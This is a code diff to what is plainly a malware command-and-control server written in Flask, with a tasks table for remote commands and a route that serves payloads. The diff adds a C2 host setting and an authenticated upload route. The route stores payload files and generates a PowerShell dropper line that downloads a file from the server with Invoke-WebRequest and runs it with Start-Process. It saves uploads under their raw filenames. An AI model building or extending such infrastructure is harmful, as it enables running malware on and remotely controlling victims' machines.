@@ -11,6 +11,17 @@ import json
 import sys
 from datetime import datetime, UTC
 
+
+try:
+    with open(os.path.join(os.path.dirname(__file__), '..', 'config.json')) as f:
+        config = json.load(f)
+except FileNotFoundError:
+    with open(os.path.join(os.path.dirname(__file__), '..', 'config.example.json')) as f:
+        config = json.load(f)
+
+C2_HOST = config.get("c2_host", "http://localhost:8080")
+
+
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
 from crypto import aes_decrypt, aes_encrypt
 
@@ -44,6 +55,11 @@ def init_db():
     c.execute("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, command TEXT, status TEXT, result TEXT)")
     conn.commit()
     conn.close()
+
+UPLOAD_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'public', 'payloads'))
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -279,6 +295,27 @@ def download_payload(filename):
 
     print(f"[+] Serving: {full_path}")
     return send_from_directory(builds_dir, filename, as_attachment=True)
+
+
+@app.route('/upload', methods=['GET', 'POST'])
+@login_required
+def upload():
+    if request.method == 'POST':
+        file = request.files.get('file')
+        if not file or file.filename == '':
+            return "No file selected", 400
+
+        filename = file.filename
+        save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        file.save(save_path)
+
+        ip = request.host.split(':')[0]
+        drop_cmd = f"Invoke-WebRequest http://{ip}/payloads/{filename} -OutFile {filename}; Start-Process {filename}"
+
+        return render_template("upload.html", success=True, filename=filename, drop_cmd=drop_cmd)
+
+    return render_template("upload.html")
+
 
 @socketio.on('connect')
 def handle_connect():
